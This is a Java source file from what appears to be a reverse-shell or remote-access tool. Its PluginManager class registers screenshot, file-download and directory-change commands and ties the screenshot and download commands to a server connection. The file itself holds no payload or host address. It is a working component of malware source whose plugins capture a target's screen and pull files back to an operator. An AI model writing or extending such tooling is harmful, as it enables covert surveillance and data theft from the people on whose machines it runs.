package obs1d1anc1ph3r.reverseshell.plugins;

import java.util.Collections;
import java.util.HashMap;
import java.util.Map;
import obs1d1anc1ph3r.reverseshell.ServerConnection;

public class PluginManager {

	private final Map<String, CommandPlugin> plugins = new HashMap<>();

	//Do the thing
	public PluginManager(ServerConnection serverConnection) {
		loadPlugins(serverConnection);
	}
	
	//Doing the thing
	private void loadPlugins(ServerConnection serverConnection) {
		//Initialize the stuff and give them the dependancies  
		ScreenshotCommand screenshotCommand = new ScreenshotCommand();
		screenshotCommand.setServerConnection(serverConnection);
		plugins.put(screenshotCommand.getCommandName().toLowerCase(), screenshotCommand);

		DownloadCommand downloadCommand = new DownloadCommand();
		downloadCommand.setServerConnection(serverConnection);
		plugins.put(downloadCommand.getCommandName().toLowerCase(), downloadCommand);

		CDCommand cdCommand = new CDCommand();
		plugins.put(cdCommand.getCommandName().toLowerCase(), cdCommand);
	}

	public CommandPlugin getPlugin(String commandName) {
		return plugins.get(commandName.toLowerCase());
	}

	public Map<String, CommandPlugin> getPlugins() {
		return Collections.unmodifiableMap(plugins);
	}
}
